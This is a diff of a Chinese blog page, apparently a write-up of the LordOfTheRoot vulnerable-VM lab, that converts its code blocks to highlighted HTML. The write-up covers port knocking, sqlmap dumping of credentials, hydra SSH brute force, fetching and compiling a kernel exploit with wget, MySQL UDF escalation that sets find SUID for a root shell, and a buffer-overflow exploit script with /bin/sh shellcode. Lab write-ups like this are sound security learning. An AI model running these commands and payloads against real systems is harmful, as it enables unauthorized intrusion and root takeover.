@@ -20,7 +20,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -161,8 +161,8 @@
 <p><img src="/../image/image-20240426141555420.png" alt="image-20240426141555420"></p>
 <p><strong>获得目标地址：192.168.174.151</strong></p>
 <p>再次复盘时，不知道为什么nmap扫不到了，但用arp-sacn -l确找的得到，去搜了下区别又学到了一些<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63442530/article/details/137023387">扫描方法</a></p>
-<pre><code class="bash">for i in &#123;1..254&#125;; do ping -c 1 -w 0.1 192.168.174.$i|grep from; done
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;; <span class="keyword">do</span> ping -c 1 -w 0.1 192.168.174.<span class="variable">$i</span>|grep from; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><strong>nmap -sS -A -n 192.168.174.151</strong></p>
 <ul>
 <li><code>-sS</code>: 这个参数指定使用TCP SYN扫描（半开放扫描）</li>
@@ -176,32 +176,18 @@
 <h2 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h2><p>连接22端口获得提示<br>knock ftiend to enter（敲门进入）<br>Easy as 1,2,3</p>
 <p><img src="/../image/image-20240426143540944.png" alt="image-20240426143540944"></p>
 <p>应该是在提示port_knocking（端口试探）的概要。<br>端口试探的主要目的是防止攻击者通过对端口扫描的方式对主机进行攻击。<br>端口试探是一种通过尝试连接，从外部打开原先关闭端口的方法。一旦收到正确顺序的尝试连接，防火墙就会打开一些特定的端口允许尝试连接的主机访问。<br>根据上面提示，我们尝试连接顺序连接1,2,3端口</p>
-<pre><code class="bash">knock是一个用于发送端口序列以触发特定行为的工具。它的工作原理是发送一系列的网络请求（称为&quot;击打&quot;）到指定的主机和端口组合上。通过按照指定的顺序发送这些请求，可以触发防火墙规则、端口转发或其他网络设备上的特定行为。
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">knock是一个用于发送端口序列以触发特定行为的工具。它的工作原理是发送一系列的网络请求（称为<span class="string">&quot;击打&quot;</span>）到指定的主机和端口组合上。通过按照指定的顺序发送这些请求，可以触发防火墙规则、端口转发或其他网络设备上的特定行为。</span><br><span class="line"></span><br><span class="line">命令中的参数解释如下：</span><br><span class="line"></span><br><span class="line">&lt;主机&gt;：目标主机的名称或IP地址。</span><br><span class="line">&lt;端口[:协议]&gt;：指定要进行击打的端口和协议。可以指定一个或多个端口，以冒号分隔端口号和协议（TCP或UDP）。可以使用TCP或UDP协议，默认情况下使用TCP。</span><br><span class="line">其他选项的解释如下：</span><br><span class="line"></span><br><span class="line">-u, --udp：指定所有端口都使用UDP方式进行击打。</span><br><span class="line">-d, --delay &lt;t&gt;：在每个端口之间设置等待时间，以毫秒为单位。</span><br><span class="line">-4, --ipv4：强制使用IPv4地址。</span><br><span class="line">-6, --ipv6：强制使用IPv6地址。</span><br><span class="line">-v, --verbose：显示详细信息，提供更多的输出。</span><br><span class="line">-V, --version：显示knock的版本信息。</span><br><span class="line">-h, --<span class="built_in">help</span>：显示帮助信息。</span><br></pre></td></tr></table></figure>
 
-命令中的参数解释如下：
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">knock -v 192.168.16.137 1 2 3</span><br></pre></td></tr></table></figure>
 
-&lt;主机&gt;：目标主机的名称或IP地址。
-&lt;端口[:协议]&gt;：指定要进行击打的端口和协议。可以指定一个或多个端口，以冒号分隔端口号和协议（TCP或UDP）。可以使用TCP或UDP协议，默认情况下使用TCP。
-其他选项的解释如下：
-
--u, --udp：指定所有端口都使用UDP方式进行击打。
--d, --delay &lt;t&gt;：在每个端口之间设置等待时间，以毫秒为单位。
--4, --ipv4：强制使用IPv4地址。
--6, --ipv6：强制使用IPv6地址。
--v, --verbose：显示详细信息，提供更多的输出。
--V, --version：显示knock的版本信息。
--h, --help：显示帮助信息。
-</code></pre>
-<pre><code class="bash">knock -v 192.168.16.137 1 2 3
-</code></pre>
 <p><img src="/../image/image-20240426144003787.png" alt="image-20240426144003787"></p>
 <p>再次进行端口扫描</p>
 <p>nmap -p- </p>
 <p><img src="/../image/image-20240426144405510.png" alt="image-20240426144405510"></p>
 <p>发现一个1337端口</p>
 <p>这里看别的wp，发现了另一种写法</p>
-<pre><code class="bash">for port in $(seq 1 3 ) ; do nmap 192.168.0.4 -p $port;done
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 3 ) ; <span class="keyword">do</span> nmap 192.168.0.4 -p <span class="variable">$port</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
 <ul>
 <li><p>for port in $(seq 1 3)：这是一个for循环语句，它将变量port设置为从1到3的序列。这意味着循环将执行三次，每次将port设置为1、2和3。</p>
 </li>
@@ -214,120 +200,110 @@
 <p>只有一张图片，但提示了mordor，尝试访问一下这个目录</p>
 <p><img src="/../image/image-20240426144733009.png" alt="image-20240426144733009"></p>
 <p>又是只有一张图THE BLACK GATEIS TOO MAINSTREAM，查看源代码，发现一串加密的字符串</p>
-<pre><code class="html">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;--&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;--&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>方cmd5去跑一下，查询结果是</p>
-<pre><code class="tex">Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
-</code></pre>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</span><br></pre></td></tr></table></figure>
+
 <p>左边的一串也类似加密的字符串，再跑一遍</p>
-<pre><code class="tex">/978345210/index.php
-</code></pre>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/978345210/index.php</span><br></pre></td></tr></table></figure>
+
 <p>得到一个目录，尝试访问一下</p>
 <p><img src="/../image/image-20240426145119047.png" alt="image-20240426145119047"></p>
 <p>发现是一个登陆界面，直接用sqlmap试试，抓包，保存，-r</p>
 <p><img src="/../image/image-20240426162217794.png" alt="image-20240426162217794"></p>
 <p>发现不知道要跑多久，搜了下，换了个参数</p>
-<pre><code>sqlmap -r 1.txt -D Webapp --tables --threads=10 --batch
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D Webapp --tables --threads=10 --batch</span><br></pre></td></tr></table></figure>
+
 <p>爆出来个User表</p>
-<pre><code>sqlmap -r 1.txt -D Webapp --dump -T Users --threads=10 --batch
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D Webapp --dump -T Users --threads=10 --batch</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426165336227.png" alt="image-20240426165336227"></p>
 <p>发现了用户名和密码，明文存取，试试登陆，每一个好像都是一样图片，试试用这些账号远程登陆试试，可以用hydra，先把这些账号密码分别保存到txt文件中</p>
-<pre><code class="bash">hydra -L username.txt -P password.txt ssh://192.168.174.151
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.174.151</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426170701782.png" alt="image-20240426170701782"></p>
 <p>发现第二个账号是可以登陆的，用它登陆上去试试</p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="利用内核漏洞提取39166-c"><a href="#利用内核漏洞提取39166-c" class="headerlink" title="利用内核漏洞提取39166.c"></a>利用内核漏洞提取39166.c</h3><p><strong>uname -a</strong><br>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p>
 <p>发现是ubuntu14.04，去找找有什么能够利用的漏洞，发现一个Ubuntu特权提升漏洞（CVE-2021-3493），去试试。操作不允许。。。看下wp用的是啥，在msf里找,带39166.c的</p>
-<pre><code>searchsploit Ubuntu 14.04
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Ubuntu 14.04</span><br></pre></td></tr></table></figure>
+
 <p>然后把他复制过来</p>
-<pre><code>searchsploit -m 39166.c
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 39166.c</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426222616464.png" alt="image-20240426222616464">然后在复制的地方搭建个一句话服务器</p>
-<pre><code class="bash">python -m http.server 9966
-wget http://192.168.174.137:9966/39166.c
-#然后
-gcc 39166.c -o 39166
-./39166
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br><span class="line">wget http://192.168.174.137:9966/39166.c</span><br><span class="line"><span class="comment">#然后</span></span><br><span class="line">gcc 39166.c -o 39166</span><br><span class="line">./39166</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426222841696.png" alt="image-20240426222841696"></p>
-<pre><code>cd /root
-cat Flat.txt
-“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
-– Gandalf
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cat Flat.txt</span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426223158566.png" alt="image-20240426223158566"></p>
 <h3 id="另一种方法-使用mysql提权"><a href="#另一种方法-使用mysql提权" class="headerlink" title="另一种方法:使用mysql提权"></a>另一种方法:使用mysql提权</h3><p>查看mysql 的版本</p>
-<pre><code class="bash">ps -aux | grep mysql
-mysql --version
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep mysql</span><br><span class="line">mysql --version</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426224959010.png" alt="image-20240426224959010"></p>
 <p>查看mysql 数据库的root密码,这个可以去网站连接数据库的命令查看</p>
 <p><img src="/../image/image-20240426225137108.png" alt="image-20240426225137108"></p>
 <p>root:darkshadow</p>
 <p>看看可以不以使用UDF提权，因为mysql是root用户运行的，如果我们提权成功，将获得root权限</p>
-<pre><code class="bash">mysql -uroot -pdarkshadow
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pdarkshadow</span><br></pre></td></tr></table></figure>
+
 <p>进入数据库后，看看secure_file_priv的配置</p>
-<pre><code>当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出文件，此时无法提权
- 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出文件只能发生在 /tmp/ 目录下，此时也无法提权
- 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出文件做限制，此时可提权
-</code></pre>
-<pre><code class="sql">show global variables like &#39;secure%&#39;;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出文件，此时无法提权</span><br><span class="line"> 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出文件只能发生在 /tmp/ 目录下，此时也无法提权</span><br><span class="line"> 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出文件做限制，此时可提权</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426225755198.png" alt="image-20240426225755198"></p>
 <p>查看主机版本及数据库架构</p>
-<pre><code class="sql">show variables like &#39;%compile%&#39;;
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%compile%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426225843760.png" alt="image-20240426225843760"></p>
 <p>因数据库为i6886,要使用32位udf文件</p>
 <p>查看plugin目录地址，此处为上传udf文件地址</p>
-<pre><code class="sql">show variables like &#39;plugin%&#39;;
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;plugin%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426225930605.png" alt="image-20240426225930605"></p>
 <p>&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</p>
 <p>可以在msf的&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql下，找到udf文件</p>
-<pre><code>cd /usr/share/metasploit-framework/data/exploits/mysql
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/data/exploits/mysql</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426230405789.png" alt="image-20240426230405789"></p>
 <p>将文件复制出来，因为是32位架构，所以使用lib_mysqludf_sys_32.so</p>
-<pre><code>cp lib_mysqludf_sys_32.so /root
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp lib_mysqludf_sys_32.so /root</span><br></pre></td></tr></table></figure>
+
 <p>再搭一个一句话服务器9966端口，然后在靶机上下载</p>
-<pre><code>wget http://192.168.174.137:9966/lib_mysqludf_sys_32.so
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.137:9966/lib_mysqludf_sys_32.so</span><br></pre></td></tr></table></figure>
+
 <p>然后连接数据库，进入一个库，我这里用的是mysql</p>
 <p>创建一个表，用来存储udf文件内容</p>
-<pre><code class="sql">create table foo(line blog);
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo(line blog);</span><br></pre></td></tr></table></figure>
+
 <p>在MySQL中Blob是一个二进制的对象,Blob类型  最大能容纳65KB的</p>
 <p><img src="/../image/image-20240426232307745.png" alt="image-20240426232307745"></p>
 <p>将udf文件插入到temp表中</p>
-<pre><code class="mysql">insert into foo(line) values (load_file(&#39;/home/smeagol/lib_mysqludf_sys_32.so&#39;));
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into foo(line) values (load_file(&#x27;/home/smeagol/lib_mysqludf_sys_32.so&#x27;));</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426232545078.png" alt="image-20240426232545078"></p>
 <p>在&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;目录下，新建一个udf32.so文件，将表中数据存入</p>
-<pre><code class="mysql">select line from foo into dumpfile &quot;/usr/lib/mysql/plugin&quot;;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select line from foo into dumpfile &quot;/usr/lib/mysql/plugin&quot;;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426233332384.png" alt="image-20240426233332384"></p>
 <p>将udf32.so文件导入数据库，定义一个函数名称sys_eval</p>
-<pre><code class="mysql">reate function sys_eval returns string soname &#39;udf32.so&#39;;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reate function sys_eval returns string soname &#x27;udf32.so&#x27;;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426233640781.png" alt="image-20240426233640781"></p>
 <p>使用sys_eval函数，执行linux命令</p>
 <p><img src="/../image/image-20240426233709376.png" alt="image-20240426233709376"></p>
 <p>提权成功，给find命令赋予普通用户使用可以暂时获取root用户使用权限</p>
-<pre><code class="mysql">select sys_eval(&#39;chmod u+s /usr/bin/find&#39;);
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426234038902.png" alt="image-20240426234038902"></p>
 <p>通过find命令的 exec参数，获取root的shell</p>
-<pre><code class="bash">find ./ 1.txt -exec &#39;/bin/sh&#39; \;
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ./ 1.txt -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240426234322595.png" alt="image-20240426234322595"></p>
-<h3 id="法三：缓冲区溢出提权"><a href="#法三：缓冲区溢出提权" class="headerlink" title="法三：缓冲区溢出提权."></a><strong>法三</strong>：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/325745.html">缓冲区溢出提权</a>.</h3><pre><code>ls -lahR
-</code></pre>
+<h3 id="法三：缓冲区溢出提权"><a href="#法三：缓冲区溢出提权" class="headerlink" title="法三：缓冲区溢出提权."></a><strong>法三</strong>：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/325745.html">缓冲区溢出提权</a>.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lahR</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li><strong>ls</strong> -a           <em># 显示当前目录中的所有文件和目录，包括隐藏文件</em></li>
 <li><strong>ls</strong> -lh          <em># 以人类可读的方式显示当前目录中的文件和目录大小</em></li>
@@ -336,23 +312,20 @@ mysql --version
 <p>学到一个批量看文件的命令</p>
 <p><img src="/../image/image-20240427224437242.png" alt="image-20240427224437242"></p>
 <p>这个文件是放在&#x2F;SECRET&#x2F;door3的file的文件,可以用</p>
-<pre><code>./file $(python -c &#39;print&#39; &quot;A&quot;*200&#39;)
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./file $(python -c &#x27;print&#x27; &quot;A&quot;*200&#x27;)</span><br></pre></td></tr></table></figure>
+
 <p>测试</p>
 <p><img src="/../image/image-20240427224801334.png" alt="image-20240427224801334"></p>
 <p>这里使用gdb工具进行调试</p>
-<pre><code>gdb -q ./file
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb -q ./file</span><br></pre></td></tr></table></figure>
+
 <p>既然在测试中200个字节就已经产生了溢出，那就先去生成一个不重复的两百的字节大小的字符串,这里用msf中的pattern_create.rb构造</p>
-<pre><code>locate pattern_
-cd /usr/share/metasploit-framework/tools/exploit 
-./pattern_create.rb -l 200
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-</code></pre>
-<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
-这两个脚本是专门用来作为缓冲区溢出查找偏移量的
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate pattern_</span><br><span class="line">cd /usr/share/metasploit-framework/tools/exploit </span><br><span class="line">./pattern_create.rb -l 200</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb</span><br><span class="line">这两个脚本是专门用来作为缓冲区溢出查找偏移量的</span><br></pre></td></tr></table></figure>
+
+
+
 <p>然后把这个字符串作为参数，放到gdb里run一下</p>
 <p>走到这里和攻略不一样了，<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/343808.html">先换一种方法</a></p>
 <p>在之前查看文件的基础上，可以发现间隔了几分钟后，我们再次查看，发现文件大小发生了变化</p>
@@ -361,10 +334,8 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 <p>时使用ldd命令查看file ldd（查看依赖情况）</p>
 <p><img src="/../image/image-20240427230232377.png" alt="image-20240427230232377"></p>
 <p>这个是因为存在一个防护机制ASLR，我们查看ASLR设置</p>
-<pre><code>cat /proc/sys/kernel/randomize_va_space
-或
-sysctl -a --pattern randomize
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">或</span><br><span class="line">sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427230333280.png" alt="image-20240427230333280"></p>
 <p>返回2</p>
 <p>0 &#x3D; 关闭</p>
@@ -382,28 +353,28 @@ sysctl -a --pattern randomize
 </ol>
 <p>首先我们找到那个5.1k的file，然后把他搞到kali里面</p>
 <p>我这里直接base64编码复制出来</p>
-<pre><code>base64 file
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64 file</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427230658503.png" alt="image-20240427230658503"></p>
 <p>复制放到本地的一个文本中，并且复原成file,然后解密</p>
-<pre><code>cat 1.txt | base64 -d &gt; file
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 1.txt | base64 -d &gt; file</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427230953611.png" alt="image-20240427230953611"></p>
 <p>此时在确定file是5.1k的情况下查看<strong>md5值</strong>，与kali里的进行对比</p>
-<pre><code>md5sum file
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum file</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427231057051.png" alt="image-20240427231057051"></p>
 <p>可以发现是一样的，这里也使用GDB进行分析，博主推荐两个插件</p>
-<pre><code>pwndbg和peda
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg和peda</span><br></pre></td></tr></table></figure>
+
 <p>下面就是调试了</p>
 <p>先授予权限并执行</p>
-<pre><code>chmod +x file 
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x file </span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427231812796.png" alt="image-20240427231812796"></p>
 <p>当把值加大后，回显段报错，用之前用的的方法生成个1000位值</p>
-<pre><code>./patern_create.rb -l 1000
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./patern_create.rb -l 1000</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427232203712.png" alt="image-20240427232203712"></p>
 <p>再使用GDB执行值</p>
 <p><img src="/../image/image-20240427233451400.png" alt="image-20240427233451400"></p>
@@ -413,14 +384,13 @@ sysctl -a --pattern randomize
 <p>0x41376641 in ?? ()</p>
 <p>查看到错误点在41376641</p>
 <p><strong>分析错误点判断偏移量</strong></p>
-<pre><code>./pattern_offset.rb -q 41376641
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pattern_offset.rb -q 41376641</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427232550038.png" alt="image-20240427232550038"></p>
 <p>得到偏移位置171</p>
 <p><strong>尝试在偏移量171溢出后情况</strong></p>
-<pre><code>gdb$run $(python -c &#39;print(&quot;A&quot; * 171 + &quot;B&quot; * 4)&#39;)
-//我感觉明白前面不行是为什么了，我这里要加括号,python3print变成fun必须+括号
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb$run $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;B&quot; * 4)&#x27;)</span><br><span class="line">//我感觉明白前面不行是为什么了，我这里要加括号,python3print变成fun必须+括号</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240427233917963.png" alt="image-20240427233917963"></p>
 <p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。ESP就是前面说的，始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。</p>
 <p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</p>
@@ -428,13 +398,13 @@ sysctl -a --pattern randomize
 <p>可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令。</p>
 <p><strong>Nop空间测试ESP</strong></p>
 <p>由于开启了ASLR机制，需要进行nop sled来爆破一个空间出来</p>
-<pre><code>run $(python -c &#39;print(&quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000)&#39;)
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000)&#x27;)</span><br></pre></td></tr></table></figure>
+
 <p>写入171个A之后，写入4个B，之后写入90</p>
 <p><img src="/../image/image-20240427234217740.png" alt="image-20240427234217740"></p>
 <p>我们成功的控制了eip中的内容，ESP就是我们溢出之后执行shellcode的地方</p>
-<pre><code>x/s $esp
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/s $esp</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240428104020602.png" alt="image-20240428104020602"></p>
 <p>0xffffbf30这是nop sled的地址开始处，当ESP指向该地址处后，就会执行栈堆空间的payload获得shell</p>
 <p>这里做到后面做错了。。。不能在本机跑。。。，内存都不一样了。。。</p>
@@ -442,42 +412,17 @@ sysctl -a --pattern randomize
 <p>看wp，作者在&#x2F;SECRET中执行的代码，这三次代码相同，但是每次esp地址却不同，甚至第三次他又没产生溢出漏洞，这就是我们上面讲的ASLR，他的地址在动态变化，防止我们制造出溢出漏洞，我想们需要饶过他</p>
 <p>假设他每次地址都在随机变化，那我们只要指定一个地址填充到eip中，并不断执行构造溢出，那是不是他终究会出现随机到和我们指定的地址相同这种情况，时不时就会执行我们的shellcode</p>
 <p>编写exp</p>
-<pre><code class="python">#!/bin/python
-import os
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">buf=<span class="string">&quot;A&quot;</span>*<span class="number">171</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#for a in &#123;1..1000&#125;; do ./file $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;); done</span></span><br><span class="line">shell=buf+<span class="string">&quot;\x40\xee\xff\xbf&quot;</span>+<span class="string">&quot;C&quot;</span>*<span class="number">20000</span>+<span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;./file&#x27;</span>+<span class="string">&quot; &quot;</span>+shell)</span><br></pre></td></tr></table></figure>
 
-buf=&quot;A&quot;*171
-
-shellcode=&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;
